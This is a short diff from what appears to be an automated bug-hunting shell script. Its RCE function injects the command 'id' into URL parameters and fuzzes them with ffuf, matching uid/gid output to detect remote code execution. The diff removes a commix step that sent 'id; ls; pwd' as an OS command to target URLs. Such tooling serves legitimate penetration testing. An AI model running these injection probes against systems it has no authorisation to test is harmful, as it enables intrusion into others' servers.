@@ -1284,10 +1284,7 @@ RCE(){
 
 	cat ${TMPDIR}/filteredurls.txt | pvreplace -silent -payload id -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${TMPDIR}/rce_pvreplace.txt
 
-	ffuf -s -u FUZZ -w ${TMPDIR}/rce_pvreplace.txt -mr "uid=\d+\(\w+-?\w*\) gid=\d+\(\w+-?\w*\) groups=\d+\(\w+-?\w*\)" | unew -el -t -q ${TMPDIR}/rce_ffuf.txt
-
-	# commix
-	interlace --silent -tL ${TMPDIR}/filteredurls.txt -threads 1 -c "timelimitx -t ${COMMIX_TIMELIMITX} commix --batch -u \"_target_\" --output-dir vuln --os-cmd=\"id; ls; pwd\""
+	ffuf -s -u FUZZ -w ${TMPDIR}/rce_pvreplace.txt -mr "uid=\d+\(\w+-?\w*\) gid=\d+\(\w+-?\w*\) groups=\d+\(\w+-?\w*\)" | unew -el -t -q ${TMPDIR}/rce.txt
 
 	STOP_SPINNER
 	DISPLAYINFO "RCE" "${TMPDIR}/rce.txt"
